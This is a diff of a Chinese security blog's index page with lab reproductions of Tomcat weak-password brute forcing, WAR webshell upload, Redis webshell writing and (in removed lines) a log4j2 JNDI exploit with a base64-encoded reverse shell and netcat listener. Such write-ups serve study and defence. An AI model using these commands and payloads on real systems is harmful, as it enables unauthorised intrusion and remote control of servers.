@@ -200,6 +200,184 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/29/Tomcat-%E5%8F%A3%E4%BB%A4%E5%8F%AF%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">Tomcat:口令可爆破</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-29 14:53:22" itemprop="dateCreated datePublished" datetime="2022-06-29T14:53:22+08:00">2022-06-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-18 17:22:35" itemprop="dateModified" datetime="2022-07-18T17:22:35+08:00">2022-07-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>&#x2F;manager&#x2F;html登录界面抓包，观察有Authorization: Basic YWRtaW46YWRtaW4&#x3D;等样式字符，解码base64字符串可得到  用户名:密码  格式字符串。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用脚本把弱用户名（tomcat必须带上），弱密码以   用户名:密码   的方式组合在一起，如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tomcat:tomcat</span><br><span class="line">tomcat:123456</span><br><span class="line">admin:123456</span><br></pre></td></tr></table></figure>
+
+<p>组合脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 字典处理，把字典处理成 user:password 的格式</span><br><span class="line">def dictHandle(userFile, passFile):</span><br><span class="line">    with open(&#x27;dict_new.txt&#x27;, &#x27;w&#x27;) as new:</span><br><span class="line">        with open(userFile, &#x27;r&#x27;) as user:</span><br><span class="line">            for u in user:</span><br><span class="line">                u = u.rstrip(&#x27;\n&#x27;)</span><br><span class="line">                print(u)</span><br><span class="line">                with open(passFile, &#x27;r&#x27;) as passwd:</span><br><span class="line">                    for p in passwd:</span><br><span class="line">                        new.write(u+&#x27;:&#x27;+p)</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主函数，接收userFile和passFile参数</span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(description=&#x27;dictHandle [user] and [pass] to [user:pass].&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--userFile&#x27;, help=&#x27;user file&#x27;, required=True)</span><br><span class="line">    parser.add_argument(&#x27;--passFile&#x27;, help=&#x27;pass file&#x27;, required=True)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    dictHandle(args.userFile, args.passFile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>将组合好的字典文本，导入burp中爆破，并对每条字符串附加base64加密设置。</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150416660.png" alt="image-20220629150416660"></p>
+<p>设置自动base64加密</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629150631620.png" alt="image-20220629150631620"></p>
+<p>爆破效果如图</p>
+<p><img src="C:/Users/xiaoluanzzz/AppData/Roaming/Typora/typora-user-images/image-20220629151735862.png" alt="image-20220629151735862"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/28/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%90%8E%E9%97%A8%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/28/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-war%E5%90%8E%E9%97%A8%E4%B8%8A%E4%BC%A0/" class="post-title-link" itemprop="url">Tomcat:弱口令&war后门上传</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-28 22:21:40" itemprop="dateCreated datePublished" datetime="2022-06-28T22:21:40+08:00">2022-06-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-26 17:40:29" itemprop="dateModified" datetime="2022-11-26T17:40:29+08:00">2022-11-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>tomcat后台存在war包上传功能</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构建war包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar.exe cvf test.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>tomcat&#x2F;tomcat默认口令进入后台</p>
+<p>后台war包上传功能点，上传构建好的test.war，Deploy按钮上传war包并在后台自动解压</p>
+<p>冰蝎连接地址<a target="_blank" rel="noopener" href="http://123.58.236.76:59836/test/shell.jsp">http://123.58.236.76:59836/test/shell.jsp</a>      getshell</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1，更改tomcat默认口令</p>
+<p>2，移除war包上传功能。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/Tomcat-CVE-2020-1938-AJP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -231,7 +409,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+                <time title="修改时间：2022-09-29 14:08:46" itemprop="dateModified" datetime="2022-09-29T14:08:46+08:00">2022-09-29</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -506,7 +684,7 @@ Apache Tomcat 6.x
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+                <time title="修改时间：2022-09-30 09:11:31" itemprop="dateModified" datetime="2022-09-30T09:11:31+08:00">2022-09-30</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -539,7 +717,7 @@ Apache Tomcat 6.x
 <p>windows可以去github下载</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/MicrosoftArchive/redis/releases">https://github.com/MicrosoftArchive/redis/releases</a></p>
 <p>下载里面的zip文件，解压下来里面有一个redis-cli.exe，直接复制去用就可以了</p>
-<h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info           				//查看信息     </span><br><span class="line">flushall                 	//删除所有数据库内容：</span><br><span class="line">flushdb                    	//刷新数据库</span><br><span class="line">看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">set test &quot;who am i&quot;        	//设置变量</span><br><span class="line">config set dir dirpath     	//设置路径等配置</span><br><span class="line">config get dir/dbfilename  	//获取路径及数据配置信息</span><br><span class="line">save                       	//保存</span><br><span class="line">get                        	//变量，查看变量名称</span><br></pre></td></tr></table></figure>
+<h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">info           				//查看信息     </span><br><span class="line">flushdb                    	//刷新数据库</span><br><span class="line">看所有键：KEYS *，使用select num可以查看键值数据。</span><br><span class="line">set test &quot;who am i&quot;        	//设置变量</span><br><span class="line">config set dir dirpath     	//设置路径等配置</span><br><span class="line">config get dir/dbfilename  	//获取路径及数据配置信息</span><br><span class="line">save                       	//保存</span><br><span class="line">get                        	//变量，查看变量名称</span><br></pre></td></tr></table></figure>
 
 <h5 id="redis写webshell"><a href="#redis写webshell" class="headerlink" title="redis写webshell"></a>redis写webshell</h5><p>条件：1，存在web目录；2，已知web绝对路径；3，存在写入权限</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir &quot;C:/phpstudy_pro/WWW/web&quot;</span><br><span class="line">config set dbfilename info.php</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
@@ -712,7 +890,7 @@ Apache Tomcat 6.x
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+                <time title="修改时间：2022-09-14 08:29:05" itemprop="dateModified" datetime="2022-09-14T08:29:05+08:00">2022-09-14</time>
               </span>
 
           
@@ -969,205 +1147,6 @@ Apache Tomcat 6.x
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/24/log4j2%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">log4j2复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-24 18:32:39" itemprop="dateCreated datePublished" datetime="2022-04-24T18:32:39+08:00">2022-04-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-22 10:05:04" itemprop="dateModified" datetime="2022-07-22T10:05:04+08:00">2022-07-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43795682/article/details/123557217">https://blog.csdn.net/weixin_43795682/article/details/123557217</a></p>
-<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>docker pull vulfocus&#x2F;log4j2-rce-2021-12-09:latest	&#x2F;&#x2F;docker拉漏洞环境</p>
-<p>docker run -p  8080:8080 -d –name log4j2-rce  vulfocus&#x2F;log4j2-rce-2021-12-09	&#x2F;&#x2F;运行环境，映射到主机8080端口</p>
-<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=$&#123;jndi:ldap://wdhcrj.dnslog.cn/exp&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%AE%83release%E4%B8%AD%E7%9A%84%E7%8E%B0%E6%88%90jar%EF%BC%8C%E5%BD%93%E7%84%B6%E8%87%AA%E5%B7%B1%E7%BC%96%E8%AF%91%E4%B9%9F%E5%8F%AF%E4%BB%A5%E3%80%82">https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md工具，下载它release中的现成jar，当然自己编译也可以。</a></p>
-<p>把JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar拖到VPS，使用以下命令，构建JNDI环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>其中YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvNDMyIDA+JjE&#x3D;是base64加密后的反弹shell命令，解密为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c &quot;&#123;echo,bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/432 0&gt;&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure>
-
-<p>以上命令的功能是反弹一个shell到VPS的432端口。</p>
-<p>由于JNDI环境需要用到8180、1099、1389这3个端口，所以要确保VPS上这3个端口未被占用，并且在云防火墙上开放这3个端口限制。</p>
-<p>JNDI命令执行后，效果如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424195833352.png" alt="image-20220424195833352"></p>
-<p>最后，VPS上监听432端口。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 432</span><br></pre></td></tr></table></figure>
-
-<p>使用上图中只有一行的链接，代入如下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:rmi://xxx.xxx.xxx.xxx:1099/jdulim&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有时注入点在get参数上，就需要把整个payloadURL编码，如下：</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/image-20220424200438345.png" alt="image-20220424200438345"></p>
-<h3 id="自动化检测"><a href="#自动化检测" class="headerlink" title="自动化检测"></a>自动化检测</h3><p>使用burp插件</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/whwlsfb/Log4j2Scan">https://github.com/whwlsfb/Log4j2Scan</a></p>
-<p>下载jar包后，导入到burpsuite扩展中，配置任意dnslog平台的api和token即可，其他保持默认</p>
-<p><img src="https://raw.githubusercontent.com/xiaoluanzzz/images/main/img/202207221004703.png" alt="image-20220722100448161"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/15/Shuize%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/15/Shuize%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/" class="post-title-link" itemprop="url">Shuize代码阅读</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-15 19:44:13" itemprop="dateCreated datePublished" datetime="2022-04-15T19:44:13+08:00">2022-04-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E8%87%AA%E5%8A%A8%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">1.自动化</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E8%87%AA%E5%8A%A8%E5%8C%96/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">1.信息收集</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>变量：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">domain	//域名</span><br><span class="line">allTargets_list=[]	//xx列表</span><br><span class="line">allTargets_Queue= Queue(-1)	//队列，先进先出，无上限</span><br><span class="line">CIP_List=[]	//C段IP列表</span><br><span class="line">ip_count = Counter()	//C段出现的IP个数</span><br><span class="line">newDomains = []	//和目标资产关联的新根域名</span><br><span class="line">socksproxysDict = &#123;&quot;baidu&quot;:[], &quot;google&quot;:[]&#125;</span><br></pre></td></tr></table></figure>
-
-<p>逻辑：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">init()###########################	//函数</span><br><span class="line">--定义变量test	//定义变量</span><br><span class="line">[这块代码的功能是什么]	//略写代码</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">init()#########################################</span><br><span class="line">--定义全局变量domain, cSubnet, save_fold_path, excel, excel_name, excelSavePath, proxy, \</span><br><span class="line">        requests_proxies, isIntranet, xlsxFileWB, weak, CIP_List, allTargets_List, \</span><br><span class="line">        allTargets_Queue, masNmapFile, newDomains, ip_count, fofaTitle, ksubdomain, justInfoGather, socksProxysDict</span><br><span class="line">打印banner()</span><br><span class="line">检查版本并打印版本信息checkVersion()</span><br><span class="line">定义命令行参数列表parse = OptionsParser(usage=usage)</span><br><span class="line">--定义变量allTargets_list,allTargets_Queue,CIP_List,ip_count,newDomains,socksproxysDict</span><br><span class="line">打印变量domain,cSubnet,isIntranet,proxy,File</span><br><span class="line">if proxy存在：</span><br><span class="line">	--定义变量requests_proxies=http和https代理</span><br><span class="line">else:</span><br><span class="line">	--定义变量requests_proxies为空</span><br><span class="line">[如果cSubnet存在，从其中取出ip，存入队列allTargets_Queue和列表allTargets_list]</span><br><span class="line">[如果File存在，且在外网，则从File文件里取ip，存入队列allTargets_Queue和列表allTargets_list]</span><br><span class="line">[扫描内网漏洞(Web或服务)]</span><br><span class="line">if File存在 and 在局域网中:</span><br><span class="line">	[内网漏洞扫描]</span><br><span class="line">else:</span><br><span class="line">	try:</span><br><span class="line">		--定义变量save_fold_path=当前目录下+/result/+uuid4()所产生随机数列的最后一列，以-为分割算</span><br><span class="line">		建立save_fold_path所代表目录</span><br><span class="line">	except Exception:</span><br><span class="line">		pass</span><br><span class="line"></span><br><span class="line">--定义变量excel=返回一个excel对象</span><br><span class="line">删除excel的第一个默认表</span><br><span class="line"></span><br><span class="line">if domain存在 and cSubnet也存在:</span><br><span class="line">	提示两者只能跑一个</span><br><span class="line">	退出程序exit(0)</span><br><span class="line">elif domain存在 and cSubnet不存在:</span><br><span class="line">	打印跑某某域名提示</span><br><span class="line">	--定义表名为domain</span><br><span class="line">	--定义表保存路径为excelSavePath</span><br><span class="line">	跑子域名run_subdomain()</span><br><span class="line">elif domain不存在 and cSubnet存在:</span><br><span class="line">	[跑C段]</span><br><span class="line">elif File存在：</span><br><span class="line">	[扫漏洞]</span><br><span class="line">elif masNmapFile:</span><br><span class="line">	[跑masscan和nmap]</span><br><span class="line">elif fofaTitle:</span><br><span class="line">	[跑fofa]</span><br><span class="line">elif domainFile:</span><br><span class="line">	[批量域名信息收集]</span><br><span class="line">elif testDemo==1:</span><br><span class="line">	--定义domian=&#x27;&#x27;</span><br><span class="line">	--定义保存路径save_fold_path=当前路径+/result/+唯一标识id</span><br><span class="line">	根据save_fold_path创建目录</span><br><span class="line">	--定义表名excel_name=domain</span><br><span class="line">	--定义excelSavePath为表格实际保存路径</span><br><span class="line">	[用来测试各模块的代码]</span><br><span class="line">elif getSocks=1:</span><br><span class="line">	[从fofa搜集代理]</span><br><span class="line">	</span><br><span class="line">run_subdomain()#########################################</span><br><span class="line">--定义companyName=跑备案新域名beianNewDomain()</span><br><span class="line">跑爱企查Aiqicha(companyName)</span><br><span class="line">--定义Subdomains_ips=&#123;&#125;</span><br><span class="line">--定义isPanAnalysis=判断是否泛解析checkPanAnalysis()</span><br><span class="line">if 